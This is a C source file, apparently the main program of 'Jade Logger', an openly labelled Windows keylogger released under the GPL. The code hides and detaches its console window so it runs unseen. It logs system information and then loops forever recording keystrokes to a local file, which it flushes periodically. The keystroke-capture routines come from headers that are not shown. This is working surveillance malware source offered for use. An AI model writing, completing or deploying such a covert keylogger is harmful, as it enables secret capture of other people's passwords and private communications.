/**
 Jade Logger - An extremely simple Windows keylogger
 Copyright (C) 2013  Adam Thompson <adam@nixgeeks.com>
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>

#include "logger.h"
#include "keyboardLogger.h"
#include "systemLogger.h"
#include "jadeLogger.h"

int main(int argc, char *argv[])
{
	FILE *logFile;
	char *logFileName;
	int i=0;
	int numCycles = 10000 / SLEEP_TIMER;

	initJadeLogger();

	// Get the logfile name, if specified
	if (argc > 1)
		logFileName = argv[1];
	else
		logFileName = DEFAULT_LOG_FILE_NAME;

	logFile = openLogFile(logFileName);  

	// Get the system information
	logSysInfo(logFile);
	
	for ( ; ; )
	{
		Sleep(SLEEP_TIMER);
		logKeystrokes(logFile);

		if (++i >= numCycles)
		{
			// Time greater than 10 seconds
			i = 0;
			logFile = freopen(logFileName, "a", logFile); // Force synchronization
		}
	}
}

static void initJadeLogger()

{
	HWND hWnd = (HWND)GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
	FreeConsole();
}